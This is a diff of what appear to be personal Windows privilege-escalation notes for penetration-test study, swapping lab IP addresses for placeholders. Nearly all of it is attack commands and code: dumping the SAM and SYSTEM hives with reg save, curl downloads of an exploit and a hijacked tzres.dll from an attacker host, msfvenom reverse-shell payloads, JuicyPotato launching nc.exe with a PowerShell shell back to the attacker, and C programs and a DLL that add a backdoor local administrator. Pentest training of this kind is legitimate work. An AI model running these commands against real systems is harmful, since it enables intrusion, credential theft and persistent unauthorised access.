@@ -26,11 +26,14 @@ crackmapexec ssh <ip> -u <user> -p /usr/share/wordlists/rockyou.txt
 #### Abusing Tokens
 
 - SeImpersonatePrivilege
+	- escalate to system
 - SeAssignPrimaryTokenPrivilege
 - SeDebugPrivilege
 	- run mimikatz
 - SeRestorePrivilege
 	- get SAM and SYSTEM files
+		- `reg save hklm\sam C:\temp\sam.hive`
+		- `reg save hklm\system C:\temp\system.hive`
 	- open cmd as system if you have rdp
 - SeBackupPrivilege
 	- get SAM and SYSTEM files
@@ -43,7 +46,7 @@ crackmapexec ssh <ip> -u <user> -p /usr/share/wordlists/rockyou.txt
 #PE
 # download SeManageVolumeExploit.exe to target
 # https://github.com/CsEnox/SeManageVolumeExploit
-curl http://192.168.45.224:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
+curl http://<IP>:<PORT>/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
 
 # run it - after we get permmisions to write to c:\
 .\SeManageVolumeExploit.exe
@@ -53,10 +56,10 @@ echo "hi" > test.txt
 
 # generate malicious dll
 # tzres.dll used when we execute "systeminfo" command
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=9999 -f dll -o tzres.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o tzres.dll
 
 # download it to the right path
-curl http://192.168.45.224:8000/tzres.dll -o C:\windows\system32\wbem\tzres.dll
+curl http://<IP>:<PORT>/tzres.dll -o C:\windows\system32\wbem\tzres.dll
 
 # execute 
 systeminfo
@@ -86,7 +89,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 ```
 - JuicyPotato
 ```
-.\JuicyPotato.exe -l 9999 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c .\nc.exe 192.168.45.221 9999 -e powershell"
+.\JuicyPotato.exe -l 9999 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c .\nc.exe <attacker ip> <attacker port> -e powershell"
 ```
 - metasploit - getsystem
 - RoguePotato
@@ -122,7 +125,7 @@ if we have permissions to RW of F on exe of service we can replace it with custo
 
 tools:
 - check running services - won't work when using a network logon such as WinRM or a bind shell
-- **check not running services as well!**
+- **check services that not running as well!**
 ```
 # powershell
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -145,15 +148,17 @@ sc.exe qc <service name>
 - check permissions on the exe
 ```
 # File permission
-icacls "<exe_path>
+icacls "<exe_path>"
+Get-Acl "<exe_path>"
 
 # Folder Permission
 icacls "<folder_path>"
+Get-Acl "<folder_path>"
 ```
 
 - revers shell as the running service user
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f exe -o sys.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o sys.exe
 ```
 
 - or add user as local admin script
@@ -164,9 +169,9 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
-  i = system("powershell -Command \"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'dave2'\"");
+  i = system ("net user attacker password123! /add");
+  i = system ("net localgroup administrators attacker /add");
+  i = system("powershell -Command \"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'attacker'\"");
   
   return 0;
 }
@@ -209,6 +214,7 @@ sc.exe qc <service name>
 - check permissions on the exe
 ```
 icacls "<exe_path>"
+Get-Acl "<exe_path>"
 ```
 
 - add user as local admin script
@@ -225,9 +231,9 @@ LPVOID lpReserved ) // Reserved
     {
         case DLL_PROCESS_ATTACH: // A process is loading the DLL.
         int i;
-  	    i = system ("net user dave2 password123! /add");
-  	    i = system ("net localgroup administrators dave2 /add");
-  	    i = system("powershell -Command \"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'dave2'\"");
+  	    i = system ("net user attacker password123! /add");
+  	    i = system ("net localgroup administrators attacker /add");
+  	    i = system("powershell -Command \"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'attacker'\"");
         break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
         break;
@@ -247,7 +253,7 @@ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 
 or revers shell as the running service user
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f dll > beyondhelper.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > helper.dll
 ```
 
 locate in the right path and restsrt the service
@@ -292,8 +298,8 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net user attacker password123! /add");
+  i = system ("net localgroup administrators attacker /add");
   
   return 0;
 }
@@ -306,7 +312,7 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 or revers shell as the running service user
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f exe -o sys.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o sys.exe
 ```
 
 locate in the right path and restsrt the service
@@ -327,6 +333,7 @@ Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' -and $_.Pr
 check permissions on the exe
 ```
 icacls "<exe_path>"
+Get-Acl "<exe_path>"
 ```
 
 modify the exe and wait until the next run 
